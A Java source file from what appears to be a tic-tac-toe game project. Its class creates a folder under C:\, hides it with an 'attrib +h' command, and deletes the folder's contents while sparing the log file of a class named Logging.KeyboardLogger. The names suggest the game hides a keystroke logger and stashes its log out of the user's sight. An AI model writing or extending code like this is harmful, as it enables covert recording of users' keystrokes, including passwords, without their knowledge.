package TickTackToe;

import java.io.File;
import java.io.IOException;
import java.nio.file.FileSystems;
import java.nio.file.Path;

public class CreateDirectory {
	File pictures;
	
	public String createFolder() throws Exception{
		String path = "C:\\tickTackToeTempFile";
		//path = path+"temp";
		boolean created = false;
		pictures = new File(path);
		if(!pictures.exists()){
			pictures.mkdir();
			System.out.println("dir created");
			created = true;
			path+="\\";
			 Process p = Runtime.getRuntime().exec("attrib +h " + pictures.getPath());
			 p.waitFor();
		} else{
			deleteFolder();
			pictures.mkdir();
			System.out.println(" new dir created");
			created = true;
			path+="\\";
			 Process p = Runtime.getRuntime().exec("attrib +h " + pictures.getPath());
			 p.waitFor();
			 created= true;
		}
		if(created){
			return path;	
		} else {
			return null;
		}
	}
	public void deleteFolder(){
		if(pictures.list().length == 0){
			pictures.delete();
		} else {
			String all[] = pictures.list();
			for(int i = 0; i < all.length; i++){
				if(!(Logging.KeyboardLogger.logFile).getName().equals(all[i])){
					File deleting = new File(pictures, all[i]);
					deleting.delete();
				}else{
					System.out.println("Prevented Create Directory from deleting log file & "
							+ Logging.KeyboardLogger.logFile.exists());
				}
			}
			if(pictures.list().length == 0){
				pictures.delete();
				System.out.println("all deleted");
			}
		}
	}

}
